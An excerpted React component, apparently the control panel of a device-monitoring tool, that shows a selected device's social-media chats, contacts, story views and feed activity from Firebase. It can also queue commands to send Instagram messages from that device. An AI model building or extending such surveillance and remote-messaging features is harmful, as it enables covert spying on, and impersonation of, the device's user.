...
const SocialMediaTab = () => {
  ...
  useEffect(() => {
    ...
    const contactsRef = ref(db, `Device/${selectedDevice}/social_media/contacts`);
    const activityRef = ref(db, `Device/${selectedDevice}/social_media/activity`);
  ...
  const sendNewMessage = async () => {
    if (!selectedDevice || !newMessage.username.trim() || !newMessage.content.trim()) return;
    try {
      const sendRef = ref(db, `Device/${selectedDevice}/social_media/commands`);
      const newCommandRef = push(sendRef);
      await set(newCommandRef, {
      ...
      setNewMessage({ username: "", content: "", packageName: "com.instagram.android" });
    } catch (err) {
              ...
              <div className="new-message-form">
                ...
                <div className="form-buttons">
                  <button 
                    ...
                    disabled={!newMessage.username.trim() || !newMessage.content.trim()}
                  >
                    Send
                  </button>
                  <button 
                    onClick={() => setNewMessage({ username: "", content: "", packageName: "com.instagram.android" })}
                  >
                    Clear
                  </button>
                </div>
        ...
        <>
              ...
              <div className="filter-section">
                ...
                <div className="filter-type">
                  ...
                  {platformOptions.map((platform) => (
                    <button
                      key={platform.value}
                      className={`filter-button ${platformFilter === platform.value ? "active" : ""}`}
          ...
          <div className="message-stats-dashboard">
            ...
            <div className="stat-card">
              ...
              <div className="stat-content">
                <span className="stat-value">{Object.keys(stats.platforms).length}</span>
              ...
              <div className="message-list-by-chat">
                {sortedChats.map((chatId) => (
                  <div key={chatId} className="chat-group">
                    <div className="chat-header" onClick={() => toggleChatDetails(chatId)}>
                      <img
                        src={contacts[chatId]?.profileUrl || "/default-avatar.png"}
                        alt="Profile"
                        className="chat-dp"
                      />
                      <div className="chat-info">
                        <h3 className="chat-username">{formatUsername(chatId)}</h3>
                        <div className="chat-platforms">
                          {[...new Set(messagesByChat[chatId].map(msg => msg.platform))].map(platform => (
                ...
                <div key={item.id} className="activity-item">
                  ...
                  <div className="activity-content">
                    <span className="activity-type">
                      {item.type === "story_view" ? "Story Viewed" : "Feed Activity"}
                    </span>
                    <span className="activity-platform">
